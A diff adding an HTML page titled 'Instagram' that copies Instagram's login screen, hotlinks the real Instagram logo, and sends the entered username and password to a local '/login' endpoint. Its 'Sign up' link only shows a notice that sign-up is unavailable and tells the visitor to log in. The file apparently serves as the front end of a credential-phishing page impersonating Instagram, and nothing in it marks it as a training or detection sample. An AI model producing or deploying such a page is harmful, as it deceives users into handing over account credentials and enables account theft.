@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .login-container {
+            background-color: #fff;
+            border: 1px solid #e6e6e6;
+            border-radius: 5px;
+            padding: 30px;
+            text-align: center;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+            max-width: 350px;
+            width: 100%;
+        }
+
+        .login-container img {
+            max-width: 200px;
+            margin-bottom: 20px;
+        }
+
+        .login-container form input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 3px;
+        }
+
+        .login-container form button {
+            width: 100%;
+            padding: 10px;
+            background-color: #0095f6;
+            color: #fff;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .login-container form button:hover {
+            background-color: #0072c3;
+        }
+
+        .or-divider {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #8e8e8e;
+            margin: 20px 0;
+        }
+
+        .or-divider hr {
+            flex-grow: 1;
+            height: 1px;
+            background-color: #ccc;
+            border: none;
+        }
+
+        .signup-container {
+            text-align: center;
+            margin-top: 10px;
+        }
+
+        .signup-container a {
+            color: #0095f6;
+            text-decoration: none;
+        }
+
+        /* Popup styles */
+        .popup-background {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1;
+        }
+
+        .popup-content {
+            background-color: #fff;
+            border-radius: 5px;
+            padding: 20px;
+            text-align: center;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.3);
+        }
+
+        .popup-content h2 {
+            margin-top: 0;
+        }
+
+        .popup-content button {
+            padding: 10px 20px;
+            background-color: #0095f6;
+            color: #fff;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .popup-content button:hover {
+            background-color: #0072c3;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram Logo">
+        <form action="/login" method="POST">
+            <input type="text" name="username" placeholder="Username" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Log In</button>
+        </form>
+        <div class="or-divider">
+            <hr>
+            <span>OR</span>
+            <hr>
+        </div>
+        <div class="signup-container">
+            <!-- Display a popup notice when the "Sign up" link is clicked -->
+            <a href="#" onclick="showPopup(); return false;">Sign up</a>
+        </div>
+    </div>
+
+    <!-- Popup dialog HTML (hidden by default) -->
+    <div class="popup-background" id="popup-background">
+        <div class="popup-content">
+            <h2>Notice</h2>
+            <p>You can't sign up at this time. Please log in.</p>
+            <button onclick="hidePopup();">OK</button>
+        </div>
+    </div>
+
+    <script>
+        // JavaScript functions to show and hide the popup
+        function showPopup() {
+            document.getElementById("popup-background").style.display = "flex";
+        }
+
+        function hidePopup() {
+            document.getElementById("popup-background").style.display = "none";
+        }
+    </script>
+</body>
+</html>
